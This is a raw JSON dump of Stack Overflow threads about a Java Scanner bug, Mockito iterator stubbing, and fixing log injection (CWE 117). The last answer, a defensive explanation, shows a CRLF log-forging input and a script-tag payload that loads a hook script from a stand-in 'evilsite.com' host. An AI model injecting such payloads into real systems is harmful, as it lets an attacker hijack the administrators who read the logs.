Avinash"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1590181090,"creation_date":1590181090,"answer_id":61963778,"question_id":61963074,"body_markdown":"You need to build a good understanding of basics before you try to work on this problem. I&#39;ve highlighted some of the problems from your program:\r\n\r\n 1. If the value of `normal.length &gt;= 1`, the following statement will create an infinite loop. You need to put expression to change the value `i` (e.g. `i++`) in the last section of the loop statement.\r\n\r\n\t\tfor (int i=0; i &lt; normal.length;)\r\n\r\n 2. You do not need multiple instances of `Random` to generate more than one random numbers. Given below is an example of how to generate multiple random numbers using the same instance of `Random`.\r\n\r\n\t\tRandom random = new Random();\r\n\t\tint randomNum = random.nextInt(10) + 1;\r\n\t\tint randomNum2 = random.nextInt(12) + 1;\r\n\r\n 3. Whenever you read something from a file using a scanner, you should always use `Scanner::hasNextLine` to avoid `NoSuchElementException` e.g. the following code block\r\n\r\n\t\tfor (int i=0; i &lt; normal.length; i++) {\r\n\t\t\tnormal[i] = reader.nextLine();\r\n\t\t\t//...\r\n\t\t}\r\n\r\n  should be written as\r\n\r\n\t\tfor (int i=0; i &lt; normal.length &amp;&amp; reader.hasNextLine(); i++) {\r\n\t\t\tnormal[i] = reader.nextLine();\r\n\t\t\t//...\r\n\t\t}\r\n\r\n 4. The `break` without a condition is meaningless in a loop e.g. the `break` statement in the following block will cause the loop to terminate after the first iteration refuting the purpose of using the loop.\r\n\r\n\t\tfor (int i=0; i &lt; medieval.length;i++) {\r\n\t\t\tSystem.out.println(medieval[randomNum2]);\r\n\t\t\tbreak;\r\n\t\t}","title":"Scanner.nextLine() is returning nothing when I try to use it twice","body":"<p>You need to build a good understanding of basics before you try to work on this problem. I've highlighted some of the problems from your program:</p>\n\n<ol>\n<li><p>If the value of <code>normal.length &gt;= 1</code>, the following statement will create an infinite loop. You need to put expression to change the value <code>i</code> (e.g. <code>i++</code>) in the last section of the loop statement.</p>\n\n<pre><code>for (int i=0; i &lt; normal.length;)\n</code></pre></li>\n<li><p>You do not need multiple instances of <code>Random</code> to generate more than one random numbers. Given below is an example of how to generate multiple random numbers using the same instance of <code>Random</code>.</p>\n\n<pre><code>Random random = new Random();\nint randomNum = random.nextInt(10) + 1;\nint randomNum2 = random.nextInt(12) + 1;\n</code></pre></li>\n<li><p>Whenever you read something from a file using a scanner, you should always use <code>Scanner::hasNextLine</code> to avoid <code>NoSuchElementException</code> e.g. the following code block</p>\n\n<pre><code>for (int i=0; i &lt; normal.length; i++) {\n    normal[i] = reader.nextLine();\n    //...\n}\n</code></pre>\n\n<p>should be written as</p>\n\n<pre><code>for (int i=0; i &lt; normal.length &amp;&amp; reader.hasNextLine(); i++) {\n    normal[i] = reader.nextLine();\n    //...\n}\n</code></pre></li>\n<li><p>The <code>break</code> without a condition is meaningless in a loop e.g. the <code>break</code> statement in the following block will cause the loop to terminate after the first iteration refuting the purpose of using the loop.</p>\n\n<pre><code>for (int i=0; i &lt; medieval.length;i++) {\n    System.out.println(medieval[randomNum2]);\n    break;\n}\n</code></pre></li>\n</ol>\n"}],"owner":{"account_id":18656661,"reputation":13,"user_id":13598912,"display_name":"Carson S."},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":102,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":61963778,"answer_count":1,"score":0,"last_activity_date":1683721902,"creation_date":1590178097,"question_id":61963074,"body_markdown":"I am making an 8 ball program for my class final and I keep running into errors with the nextLine() function I am using. At first, without the input for the user, it had been printing the answer before any question was answered, and I had thought I&#39;d figured it out, but then it returned nothing when I put them in the same for() loop. What am I doing wrong here? Here is my code.\r\n```\r\nimport java.util.Random;\r\nimport java.util.Scanner;\r\nimport java.io.*;\r\nclass Main {\r\n  public static void main(String[] args) throws IOException {\r\n    Scanner reader = new Scanner(new File(&quot;8ball.txt&quot;));\r\n    Scanner reader2 = new Scanner(new File(&quot;medievalball.txt&quot;));\r\n    System.out.println(&quot;Welcome to 8 ball! You can choose a theme: Medieval or Normal, or type &#39;quit&#39; to quit at any time.&quot;);\r\n    Scanner input = new Scanner(System.in);\r\n    String inInput = input.nextLine();\r\n    String[] normal = new String[12];\r\n    String[] medieval = new String[10];\r\n    Random random = new Random();\r\n    int randomNum = random.nextInt(10)+1;\r\n    Random random2 = new Random();\r\n    int randomNum2 = random2.nextInt(12)+1;\r\n    while (true)\r\n    {\r\n    if (inInput.equals(&quot;Normal&quot;))\r\n    {\r\n      System.out.println(&quot;You&#39;ve selected Normal. Preparing... &quot;);\r\n      \r\n      \r\n      \r\n      System.out.println(&quot;Ask me something, I can answer.&quot;);\r\n      Scanner normalInput = new Scanner(System.in);\r\n      \r\n      for (int i=0; i &lt; normal.length;i++)\r\n      {\r\n        normal[i] = normalInput.nextLine();\r\n      }\r\n    for (int i=0; i &lt; normal.length;)\r\n    {\r\n      normal[i] = reader.nextLine();\r\n     System.out.println(normal[randomNum]);\r\n     break;\r\n    }\r\n    \r\n    }\r\n   \r\n    else if (inInput.equals(&quot;Medieval&quot;))\r\n    {\r\n      System.out.println (&quot;You hath selected Medieval. Preparing...&quot;);\r\n      System.out.println(&quot;I have unbearable knowledge of the world, ask me thine question.&quot;);\r\n      Scanner medievalInput = new Scanner(System.in);\r\n      for (int i=0; i &lt; medieval.length;i++)\r\n      {\r\n        medieval[i] = medievalInput.nextLine();\r\n      }\r\n      for (int i=0; i &lt; medieval.length;i++)\r\n      {\r\n        System.out.println(medieval[randomNum2]);\r\n        break;\r\n      }\r\n    }\r\n    else if (inInput.equals (&quot;quit&quot;))\r\n    {\r\n      System.out.println (&quot;See you next time!&quot;);\r\n      System.exit(0);\r\n    }\r\n    else\r\n    {\r\n      System.out.println(&quot;Sorry, that&#39;s not a choice.&quot;);\r\n    }\r\n  }\r\n  }\r\n}\r\n```","title":"Scanner.nextLine() is returning nothing when I try to use it twice","body":"<p>I am making an 8 ball program for my class final and I keep running into errors with the nextLine() function I am using. At first, without the input for the user, it had been printing the answer before any question was answered, and I had thought I'd figured it out, but then it returned nothing when I put them in the same for() loop. What am I doing wrong here? Here is my code.</p>\n\n<pre><code>import java.util.Random;\nimport java.util.Scanner;\nimport java.io.*;\nclass Main {\n  public static void main(String[] args) throws IOException {\n    Scanner reader = new Scanner(new File(\"8ball.txt\"));\n    Scanner reader2 = new Scanner(new File(\"medievalball.txt\"));\n    System.out.println(\"Welcome to 8 ball! You can choose a theme: Medieval or Normal, or type 'quit' to quit at any time.\");\n    Scanner input = new Scanner(System.in);\n    String inInput = input.nextLine();\n    String[] normal = new String[12];\n    String[] medieval = new String[10];\n    Random random = new Random();\n    int randomNum = random.nextInt(10)+1;\n    Random random2 = new Random();\n    int randomNum2 = random2.nextInt(12)+1;\n    while (true)\n    {\n    if (inInput.equals(\"Normal\"))\n    {\n      System.out.println(\"You've selected Normal. Preparing... \");\n\n\n\n      System.out.println(\"Ask me something, I can answer.\");\n      Scanner normalInput = new Scanner(System.in);\n\n      for (int i=0; i &lt; normal.length;i++)\n      {\n        normal[i] = normalInput.nextLine();\n      }\n    for (int i=0; i &lt; normal.length;)\n    {\n      normal[i] = reader.nextLine();\n     System.out.println(normal[randomNum]);\n     break;\n    }\n\n    }\n\n    else if (inInput.equals(\"Medieval\"))\n    {\n      System.out.println (\"You hath selected Medieval. Preparing...\");\n      System.out.println(\"I have unbearable knowledge of the world, ask me thine question.\");\n      Scanner medievalInput = new Scanner(System.in);\n      for (int i=0; i &lt; medieval.length;i++)\n      {\n        medieval[i] = medievalInput.nextLine();\n      }\n      for (int i=0; i &lt; medieval.length;i++)\n      {\n        System.out.println(medieval[randomNum2]);\n        break;\n      }\n    }\n    else if (inInput.equals (\"quit\"))\n    {\n      System.out.println (\"See you next time!\");\n      System.exit(0);\n    }\n    else\n    {\n      System.out.println(\"Sorry, that's not a choice.\");\n    }\n  }\n  }\n}\n</code></pre>\n"},{"tags":["java","iterator","mockito"],"comments":[{"owner":{"account_id":3280644,"reputation":4811,"user_id":3582831,"display_name":"0xh3xa"},"score":0,"creation_date":1589979453,"post_id":61913656,"comment_id":109506823,"body_markdown":"what is the class of `gdprDAO` and argument parameter for `getGdprRowCF()`?","body":"what is the class of <code>gdprDAO</code> and argument parameter for <code>getGdprRowCF()</code>?"},{"owner":{"account_id":10526241,"reputation":29,"user_id":7757175,"accept_rate":50,"display_name":"Filomena"},"score":0,"creation_date":1589979654,"post_id":61913656,"comment_id":109506941,"body_markdown":"public Iterator&lt;Fatt0Gdpr&gt; getGdprRowCF(EntityManager emFatt0){\n\t\tStringBuilder nativeQueryBuilder = new StringBuilder();\n\t\tString nativeQuery = nativeQueryBuilder.append(&quot;SELECT * FROM TABLE_GDPR WHERE FLG_ELABORATO = &#39;N&#39; AND COD_FISCALE IS NOT NULL &quot;).toString();\n\t\tQuery queryFind = emFatt0.createNativeQuery(nativeQuery,Fatt0Gdpr.class);\t\t\n\t\treturn queryFind.getResultStream().iterator();\n\t}","body":"public Iterator&lt;Fatt0Gdpr&gt; getGdprRowCF(EntityManager emFatt0){ \t\tStringBuilder nativeQueryBuilder = new StringBuilder(); \t\tString nativeQuery = nativeQueryBuilder.append(&quot;SELECT * FROM TABLE_GDPR WHERE FLG_ELABORATO = &#39;N&#39; AND COD_FISCALE IS NOT NULL &quot;).toString(); \t\tQuery queryFind = emFatt0.createNativeQuery(nativeQuery,Fatt0Gdpr.class);\t\t \t\treturn queryFind.getResultStream().iterator(); \t}"},{"owner":{"account_id":3280644,"reputation":4811,"user_id":3582831,"display_name":"0xh3xa"},"score":0,"creation_date":1589981665,"post_id":61913656,"comment_id":109508212,"body_markdown":"But the method called `getGdprRowCF()` not `getGdprRowNDG()` in test target class?","body":"But the method called <code>getGdprRowCF()</code> not <code>getGdprRowNDG()</code> in test target class?"},{"owner":{"account_id":39208,"reputation":251240,"user_id":112968,"accept_rate":68,"display_name":"knittl"},"score":0,"creation_date":1684214404,"post_id":61913656,"comment_id":134480629,"body_markdown":"Ignoring the fact that mocking iterators is insane: your method is called with `em1Fatt0`, but your mock is set up with `emFatt0`. Are you sure you are stubbing the correct calls?","body":"Ignoring the fact that mocking iterators is insane: your method is called with <code>em1Fatt0</code>, but your mock is set up with <code>emFatt0</code>. Are you sure you are stubbing the correct calls?"}],"answers":[{"tags":[],"owner":{"account_id":3280644,"reputation":4811,"user_id":3582831,"display_name":"0xh3xa"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1589981594,"creation_date":1589979695,"answer_id":61913794,"question_id":61913656,"body_markdown":"I guess you should mock `gdprDAO` and define the behavior of `getGdprRowCF` and return `mockIterator`\r\n\r\n```\r\nMockito.when(gdprDAO.getGdprRowCF(em1Fatt0)).thenReturn(mockIterator); \r\n```\r\n---\r\nBest practice to define `List` and send it as an iterator rather than `mockIterator`\r\n\r\n```\r\nList&lt;Fatt0Gdpr&gt; list = new ArrayList&lt;&gt;();\r\nlist.add(new Fatt0Gdpr());\r\nMockito.when(gdprDAO.getGdprRowCF(em1Fatt0)).thenReturn(list.iterator()); \r\n```","title":"Mockito test iterator return always false on hasNext","body":"<p>I guess you should mock <code>gdprDAO</code> and define the behavior of <code>getGdprRowCF</code> and return <code>mockIterator</code></p>\n\n<pre><code>Mockito.when(gdprDAO.getGdprRowCF(em1Fatt0)).thenReturn(mockIterator); \n</code></pre>\n\n<hr>\n\n<p>Best practice to define <code>List</code> and send it as an iterator rather than <code>mockIterator</code></p>\n\n<pre><code>List&lt;Fatt0Gdpr&gt; list = new ArrayList&lt;&gt;();\nlist.add(new Fatt0Gdpr());\nMockito.when(gdprDAO.getGdprRowCF(em1Fatt0)).thenReturn(list.iterator()); \n</code></pre>\n"},{"tags":[],"owner":{"account_id":162699,"reputation":138060,"user_id":3788176,"accept_rate":54,"display_name":"Andy Turner"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1589980112,"creation_date":1589980112,"answer_id":61913919,"question_id":61913656,"body_markdown":"Don&#39;t mock iterators.\n\nYou should only use a mock when behavior is too difficult to create otherwise. From [Wikipedia](https://en.wikipedia.org/wiki/Mock_object#Motivation):\n\n&gt; If an object has any of the following characteristics, it may be useful to use a mock object in its place:\n&gt;\n&gt; * the object supplies non-deterministic results (e.g. the current time or the current temperature);\n&gt; * it has states that are difficult to create or reproduce (e.g. a network error);\n&gt; * it is slow (e.g. a complete database, which would have to be initialized before the test);\n&gt; * it does not yet exist or may change behavior;\n&gt; * it would have to include information and methods exclusively for testing purposes (and not for its actual task).\n\nIterators don&#39;t have any of these properties (necessarily): just make the iterator-returning method use `Arrays.asList().iterator()`, or similar.\n\n    List&lt;Fatt0Gdpr&gt; fakeData = Arrays.asList(new Fatt0Gdpr());\n    Mockito.when(fatt0GdprDAO.getGdprRowNDG(emFatt0)).thenReturn(fakeData.iterator()); ","title":"Mockito test iterator return always false on hasNext","body":"<p>Don't mock iterators.</p>\n<p>You should only use a mock when behavior is too difficult to create otherwise. From <a href=\"https://en.wikipedia.org/wiki/Mock_object#Motivation\" rel=\"nofollow noreferrer\">Wikipedia</a>:</p>\n<blockquote>\n<p>If an object has any of the following characteristics, it may be useful to use a mock object in its place:</p>\n<ul>\n<li>the object supplies non-deterministic results (e.g. the current time or the current temperature);</li>\n<li>it has states that are difficult to create or reproduce (e.g. a network error);</li>\n<li>it is slow (e.g. a complete database, which would have to be initialized before the test);</li>\n<li>it does not yet exist or may change behavior;</li>\n<li>it would have to include information and methods exclusively for testing purposes (and not for its actual task).</li>\n</ul>\n</blockquote>\n<p>Iterators don't have any of these properties (necessarily): just make the iterator-returning method use <code>Arrays.asList().iterator()</code>, or similar.</p>\n<pre><code>List&lt;Fatt0Gdpr&gt; fakeData = Arrays.asList(new Fatt0Gdpr());\nMockito.when(fatt0GdprDAO.getGdprRowNDG(emFatt0)).thenReturn(fakeData.iterator()); \n</code></pre>\n"}],"owner":{"account_id":10526241,"reputation":29,"user_id":7757175,"accept_rate":50,"display_name":"Filomena"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2354,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1683721826,"creation_date":1589979254,"question_id":61913656,"body_markdown":"I have this method:\r\n\r\n```\r\n    public void executeShadowingCF(String outputPath) throws Exception {\r\n    \t\ttry{\r\n    \t\t\t\r\n    \t\t\tIterator&lt;Fatt0Gdpr&gt; notProcessedGDPRIterator = gdprDAO.getGdprRowCF(em1Fatt0);\r\n    \t\t\t\t\t\t\r\n    \t\t\twhile(notProcessedGDPRIterator.hasNext()){\r\n    \t\t\t\tFatt0Gdpr element = notProcessedGDPRIterator.next();\r\n    \t\t\t\t\r\n    \t\t\t\tString codiceFiscale = element.getCodFiscale();\r\n    \t\t\t\t\r\n    \t\t\t\tif(codiceFiscale != null &amp;&amp; !codiceFiscale.equalsIgnoreCase(&quot;&quot;)){\r\n    \t\t\t\t\t//some operation\r\n    \t\t\t\t\t\r\n    \t\t\t\t}\r\n    \t\t\t\telse{\r\n    \t\t\t\t\tgdprDAO.updateProcessedRow(emFatt0Update, element.getIdTecnico(), &quot;99&quot;);\r\n    \t\t\t\t}\r\n    \t\t\t\t\r\n    \t\t\t}\t\t\t\t\r\n    \t\t\t\r\n    \t\t}\r\n    \t\tcatch(Exception e ){\r\n    \t\t\tlog.error(e);\r\n    \t\t}\r\n    \t\tfinally{\r\n    \t\t\temFatt0.close();\r\n    \t\t}\r\n    \t}\r\n```\r\n\r\nI&#39;m trying to test it with mockito, but when I execute the test the `notProcessedGDPRIterator.hasNext()` return always false so I can&#39;t go inside the while loop.\r\nThis is my test method:\r\n\r\n```\r\n       @Test\r\n    \tpublic void testExecuteShadowingCF() {    \r\n    \t\ttry {\r\n    \t\t\tEntityManager em1Fatt0 = Mockito.mock(EntityManager.class);\r\n    \t\t\tEntityManager emFatt0 = Mockito.mock(EntityManager.class);\r\n    \t\t\tFatt0GdprService service = new Fatt0GdprService();\t\t\t\r\n    \t\t\tFatt0GdprDAO fatt0GdprDAO = new Fatt0GdprDAO();\t\r\n    \t\t\tQuery queryFind = Mockito.mock(Query.class);\r\n    \t\t\tIterator&lt;Fatt0Gdpr&gt; mockIterator = Mockito.mock(Iterator.class);\r\n    \t\t\tMockito.when(\r\n    \t\t\t\t\temFatt0.createNativeQuery(Mockito.anyString(),\r\n    \t\t\t\t\t\t\teq(Fatt0Gdpr.class))).thenReturn(queryFind);\t\r\n    \t\t\tMockito.when(fatt0GdprDAO.getGdprRowNDG(emFatt0)).thenReturn(mockIterator);\t\r\n    \t\t\t\r\n    \t\t\tMockito.when(mockIterator.hasNext()).thenReturn(true).thenReturn(false);\r\n    \t\t\tMockito.when(mockIterator.next()).thenReturn(new Fatt0Gdpr());\r\n    \t\t\t\r\n    \t\t\tservice.setEmFatt0Updater(emFatt0);\r\n    \t\t\tEntityTransaction trxMock = Mockito.mock(EntityTransaction.class);\r\n    \t\t\tMockito.when(service.getEmFatt0Updater().getTransaction())\r\n    \t\t\t\t\t.thenReturn(trxMock);\r\n    \t\t\t\r\n    \t\t\tString outputPath = &quot;U:/RTC_U0E7069/fatt0_SRC/SRC/fatt0-gdpr-batch/target/diraliases/BATCHROOT/ITT/out&quot;;\r\n    \t\t\t\t\t\r\n    \t\t\tservice.executeShadowingCF(outputPath);\r\n    \r\n    \t\t} catch (Exception e) {\r\n    \t\t\te.printStackTrace();\r\n    \t\t}\r\n    \t}\r\n```\r\n\r\nSomeone can help me to solve this problem?\r\nThank you","title":"Mockito test iterator return always false on hasNext","body":"<p>I have this method:</p>\n\n<pre><code>    public void executeShadowingCF(String outputPath) throws Exception {\n            try{\n\n                Iterator&lt;Fatt0Gdpr&gt; notProcessedGDPRIterator = gdprDAO.getGdprRowCF(em1Fatt0);\n\n                while(notProcessedGDPRIterator.hasNext()){\n                    Fatt0Gdpr element = notProcessedGDPRIterator.next();\n\n                    String codiceFiscale = element.getCodFiscale();\n\n                    if(codiceFiscale != null &amp;&amp; !codiceFiscale.equalsIgnoreCase(\"\")){\n                        //some operation\n\n                    }\n                    else{\n                        gdprDAO.updateProcessedRow(emFatt0Update, element.getIdTecnico(), \"99\");\n                    }\n\n                }               \n\n            }\n            catch(Exception e ){\n                log.error(e);\n            }\n            finally{\n                emFatt0.close();\n            }\n        }\n</code></pre>\n\n<p>I'm trying to test it with mockito, but when I execute the test the <code>notProcessedGDPRIterator.hasNext()</code> return always false so I can't go inside the while loop.\nThis is my test method:</p>\n\n<pre><code>       @Test\n        public void testExecuteShadowingCF() {    \n            try {\n                EntityManager em1Fatt0 = Mockito.mock(EntityManager.class);\n                EntityManager emFatt0 = Mockito.mock(EntityManager.class);\n                Fatt0GdprService service = new Fatt0GdprService();          \n                Fatt0GdprDAO fatt0GdprDAO = new Fatt0GdprDAO(); \n                Query queryFind = Mockito.mock(Query.class);\n                Iterator&lt;Fatt0Gdpr&gt; mockIterator = Mockito.mock(Iterator.class);\n                Mockito.when(\n                        emFatt0.createNativeQuery(Mockito.anyString(),\n                                eq(Fatt0Gdpr.class))).thenReturn(queryFind);    \n                Mockito.when(fatt0GdprDAO.getGdprRowNDG(emFatt0)).thenReturn(mockIterator); \n\n                Mockito.when(mockIterator.hasNext()).thenReturn(true).thenReturn(false);\n                Mockito.when(mockIterator.next()).thenReturn(new Fatt0Gdpr());\n\n                service.setEmFatt0Updater(emFatt0);\n                EntityTransaction trxMock = Mockito.mock(EntityTransaction.class);\n                Mockito.when(service.getEmFatt0Updater().getTransaction())\n                        .thenReturn(trxMock);\n\n                String outputPath = \"U:/RTC_U0E7069/fatt0_SRC/SRC/fatt0-gdpr-batch/target/diraliases/BATCHROOT/ITT/out\";\n\n                service.executeShadowingCF(outputPath);\n\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n</code></pre>\n\n<p>Someone can help me to solve this problem?\nThank you</p>\n"},{"tags":["java","spring","logging","esapi","veracode"],"comments":[{"owner":{"account_id":1260683,"reputation":2986,"user_id":1219052,"accept_rate":69,"display_name":"Jimson James"},"score":0,"creation_date":1500319355,"post_id":44949254,"comment_id":77273134,"body_markdown":"Please add the solution worked for you as well.","body":"Please add the solution worked for you as well."},{"owner":{"account_id":3195747,"reputation":852,"user_id":2698960,"accept_rate":83,"display_name":"Vitaliy Borisok"},"score":0,"creation_date":1500378568,"post_id":44949254,"comment_id":77299678,"body_markdown":"@Aczire as I mentioned in UPD: I simply used ESAPI logger without any additional configuration. It used my default slf4j logger.\n\n```private static final Logger logger = ESAPI.getLogger(MyClass.class);```\n...\n```logger.error(null, &quot;Simple error message&quot;, ex);```","body":"@Aczire as I mentioned in UPD: I simply used ESAPI logger without any additional configuration. It used my default slf4j logger.  <code>private static final Logger logger = ESAPI.getLogger(MyClass.class);</code> ... <code>logger.error(null, &quot;Simple error message&quot;, ex);</code>"},{"owner":{"account_id":2615962,"reputation":872,"user_id":2265001,"accept_rate":47,"display_name":"Charu Jain"},"score":0,"creation_date":1517210228,"post_id":44949254,"comment_id":83985213,"body_markdown":"Hi @VitaliyBorisok , I am also facing the same issue. Can you please help me with what Slf4j configuration you used with ESAPI logger. I used your above suggested solution. But I am getting: Caused by: java.lang.IllegalArgumentException: Failed to load ESAPI.properties as a classloader resource.","body":"Hi @VitaliyBorisok , I am also facing the same issue. Can you please help me with what Slf4j configuration you used with ESAPI logger. I used your above suggested solution. But I am getting: Caused by: java.lang.IllegalArgumentException: Failed to load ESAPI.properties as a classloader resource."},{"owner":{"account_id":3195747,"reputation":852,"user_id":2698960,"accept_rate":83,"display_name":"Vitaliy Borisok"},"score":2,"creation_date":1517328386,"post_id":44949254,"comment_id":84046401,"body_markdown":"Hi @CharuJain, Do you have ESAPI.properties file in your classpath? ESAPI library requires this file. Check https://github.com/OWASP/EJSF/blob/master/esapi_master_FULL/WebContent/ESAPI.properties as an example of ESAPI configuration file.","body":"Hi @CharuJain, Do you have ESAPI.properties file in your classpath? ESAPI library requires this file. Check <a href=\"https://github.com/OWASP/EJSF/blob/master/esapi_master_FULL/WebContent/ESAPI.properties\" rel=\"nofollow noreferrer\">github.com/OWASP/EJSF/blob/master/esapi_master_FULL/WebConte&zwnj;&#8203;nt/&hellip;</a> as an example of ESAPI configuration file."},{"owner":{"account_id":1151448,"reputation":2547,"user_id":1133064,"accept_rate":86,"display_name":"scott.korin"},"score":2,"creation_date":1623351749,"post_id":44949254,"comment_id":120062334,"body_markdown":"I would argue that logging exceptions don&#39;t need to be sanitized for CRLF, because the exception data IS trusted (can&#39;t be manipulated by a user)","body":"I would argue that logging exceptions don&#39;t need to be sanitized for CRLF, because the exception data IS trusted (can&#39;t be manipulated by a user)"}],"answers":[{"tags":[],"owner":{"account_id":268409,"reputation":6226,"user_id":557153,"accept_rate":83,"display_name":"avgvstvs"},"down_vote_count":0,"up_vote_count":19,"is_accepted":true,"score":19,"last_activity_date":1499375163,"creation_date":1499375163,"answer_id":44958832,"question_id":44949254,"body_markdown":"&gt;  Is there any way how to fix this vulnerability without changing\r\n&gt; logger to ESAPI?\r\n\r\nIn short, yes.\r\n\r\nTLDR:\r\n\r\nFirst understand the gravity of the error. The main concern is in falsifying the log statments.  Say you had code like this:\r\n\r\n    log.error( transactionId + &quot; for user &quot; + username + &quot; was unsuccessful.&quot;\r\n\r\n\r\nIf either variable is under user control they can inject false logging statements by using inputs like `\\r\\n for user foobar was successful\\rn` thus allowing them to falsify the log and cover their tracks.  (Well, in this contrived case, just make it a little harder to see what happened.)  \r\n\r\nThe second method of attack is more of a chess move.  Many logs are HTML formatted to be viewed in another program, for this example, we&#39;ll pretend the logs are meant to be HTML files to be viewed in a browser.  Now we inject `&lt;script src=”https://evilsite.com/hook.js” type=”text/javascript”&gt;&lt;/script&gt;` and you will have hooked a browser with an exploitation framework that&#39;s most likely executing as a server admin... because its doubtful that the CEO is going to be reading the log.  Now the real hack can begin.  \r\n\r\nDefenses:  \r\n\r\nA simple defense is to make sure that all log statements with userinput escape the characters &#39;\\n&#39; and &#39;\\r&#39; with something obvious, like &#39;֎&#39; or you can do what ESAPI does and escape with the underscore.  It really doesn&#39;t matter as long as its consistent, just keep in mind not to use character sets that would confuse you in the log.  Something like `userInput.replaceAll(&quot;\\r&quot;, &quot;֎&quot;).replaceAll(&quot;\\n&quot;, &quot;֎&quot;);`\r\n\r\nI also find it useful to make sure that log formats are exquisitely specified... meaning that you make sure you have a strict standard for what log statements need to look like and construct your formatting so that catching a malicious user is easier.  All programmers must submit to the party and follow the format!  \r\n\r\nTo defend against the HTML scenario, I would use the [OWASP encoder project][1] \r\n\r\nAs to why ESAPI&#39;s implementation is suggested, it is a very battle-tested library, but in a nutshell, this is essentially what we do.  See the code:\r\n\r\n    /**\r\n\t * Log the message after optionally encoding any special characters that might be dangerous when viewed\r\n\t * by an HTML based log viewer. Also encode any carriage returns and line feeds to prevent log\r\n\t * injection attacks. This logs all the supplied parameters plus the user ID, user&#39;s source IP, a logging\r\n\t * specific session ID, and the current date/time.\r\n\t *\r\n\t * It will only log the message if the current logging level is enabled, otherwise it will\r\n\t * discard the message.\r\n\t *\r\n\t * @param level defines the set of recognized logging levels (TRACE, INFO, DEBUG, WARNING, ERROR, FATAL)\r\n\t * @param type the type of the event (SECURITY SUCCESS, SECURITY FAILURE, EVENT SUCCESS, EVENT FAILURE)\r\n\t * @param message the message to be logged\r\n\t * @param throwable the {@code Throwable} from which to generate an exception stack trace.\r\n\t */\r\n\tprivate void log(Level level, EventType type, String message, Throwable throwable) {\r\n\r\n\t\t// Check to see if we need to log.\r\n\t\tif (!isEnabledFor(level)) {\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\t// ensure there&#39;s something to log\r\n\t\tif (message == null) {\r\n\t\t\tmessage = &quot;&quot;;\r\n\t\t}\r\n\r\n\t\t// ensure no CRLF injection into logs for forging records\r\n\t\tString clean = message.replace(&#39;\\n&#39;, &#39;_&#39;).replace(&#39;\\r&#39;, &#39;_&#39;);\r\n\t\tif (ESAPI.securityConfiguration().getLogEncodingRequired()) {\r\n\t\t\tclean = ESAPI.encoder().encodeForHTML(message);\r\n\t\t\tif (!message.equals(clean)) {\r\n\t\t\t\tclean += &quot; (Encoded)&quot;;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// log server, port, app name, module name -- server:80/app/module\r\n\t\tStringBuilder appInfo = new StringBuilder();\r\n\t\tif (ESAPI.currentRequest() != null &amp;&amp; logServerIP) {\r\n\t\t\tappInfo.append(ESAPI.currentRequest().getLocalAddr()).append(&quot;:&quot;).append(ESAPI.currentRequest().getLocalPort());\r\n\t\t}\r\n\t\tif (logAppName) {\r\n\t\t\tappInfo.append(&quot;/&quot;).append(applicationName);\r\n\t\t}\r\n\t\tappInfo.append(&quot;/&quot;).append(getName());\r\n\r\n\t\t//get the type text if it exists\r\n\t\tString typeInfo = &quot;&quot;;\r\n\t\tif (type != null) {\r\n\t\t\ttypeInfo += type + &quot; &quot;;\r\n\t\t}\r\n\r\n\t\t// log the message\r\n\t\t// Fix for https://code.google.com/p/owasp-esapi-java/issues/detail?id=268\r\n\t\t// need to pass callerFQCN so the log is not generated as if it were always generated from this wrapper class\r\n\t\tlog(Log4JLogger.class.getName(), level, &quot;[&quot; + typeInfo + getUserInfo() + &quot; -&gt; &quot; + appInfo + &quot;] &quot; + clean, throwable);\r\n\t}\r\n\r\nSee lines 398-453.  That&#39;s all the escaping that ESAPI provides.  I would suggest copying the unit tests as well.  \r\n\r\n[DISCLAIMER]:  I am project co-lead on ESAPI.  \r\n\r\n  [1]: https://www.owasp.org/index.php/OWASP_Java_Encoder_Project and make sure your inputs are properly encoded when going into logging statements--every bit as much as when you&#39;re sending input back to the user.  ","title":"How to fix Veracode CWE 117 (Improper Output Neutralization for Logs)","body":"<blockquote>\n  <p>Is there any way how to fix this vulnerability without changing\n  logger to ESAPI?</p>\n</blockquote>\n\n<p>In short, yes.</p>\n\n<p>TLDR:</p>\n\n<p>First understand the gravity of the error. The main concern is in falsifying the log statments.  Say you had code like this:</p>\n\n<pre><code>log.error( transactionId + \" for user \" + username + \" was unsuccessful.\"\n</code></pre>\n\n<p>If either variable is under user control they can inject false logging statements by using inputs like <code>\\r\\n for user foobar was successful\\rn</code> thus allowing them to falsify the log and cover their tracks.  (Well, in this contrived case, just make it a little harder to see what happened.)  </p>\n\n<p>The second method of attack is more of a chess move.  Many logs are HTML formatted to be viewed in another program, for this example, we'll pretend the logs are meant to be HTML files to be viewed in a browser.  Now we inject <code>&lt;script src=”https://evilsite.com/hook.js” type=”text/javascript”&gt;&lt;/script&gt;</code> and you will have hooked a browser with an exploitation framework that's most likely executing as a server admin... because its doubtful that the CEO is going to be reading the log.  Now the real hack can begin.  </p>\n\n<p>Defenses:  </p>\n\n<p>A simple defense is to make sure that all log statements with userinput escape the characters '\\n' and '\\r' with something obvious, like '֎' or you can do what ESAPI does and escape with the underscore.  It really doesn't matter as long as its consistent, just keep in mind not to use character sets that would confuse you in the log.  Something like <code>userInput.replaceAll(\"\\r\", \"֎\").replaceAll(\"\\n\", \"֎\");</code></p>\n\n<p>I also find it useful to make sure that log formats are exquisitely specified... meaning that you make sure you have a strict standard for what log statements need to look like and construct your formatting so that catching a malicious user is easier.  All programmers must submit to the party and follow the format!  </p>\n\n<p>To defend against the HTML scenario, I would use the [OWASP encoder project][1] </p>\n\n<p>As to why ESAPI's implementation is suggested, it is a very battle-tested library, but in a nutshell, this is essentially what we do.  See the code:</p>\n\n<pre><code>/**\n * Log the message after optionally encoding any special characters that might be dangerous when viewed\n * by an HTML based log viewer. Also encode any carriage returns and line feeds to prevent log\n * injection attacks. This logs all the supplied 